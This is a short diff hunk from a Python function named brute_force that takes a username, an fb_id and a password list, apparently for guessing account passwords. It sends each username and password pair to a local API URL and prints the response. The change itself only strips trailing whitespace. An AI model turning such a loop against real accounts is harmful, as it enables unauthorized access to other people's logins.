@@ -9,7 +9,7 @@ def brute_force(username, fb_id, passwords):
         try:
             # Example: Make a request to the local API without using a proxy
             result = requests.get(local_api_url, params={'username': username, 'password': password}, timeout=10)
-            
+
             # Process result as needed
             print(result.text)
         except requests.exceptions.RequestException as e:
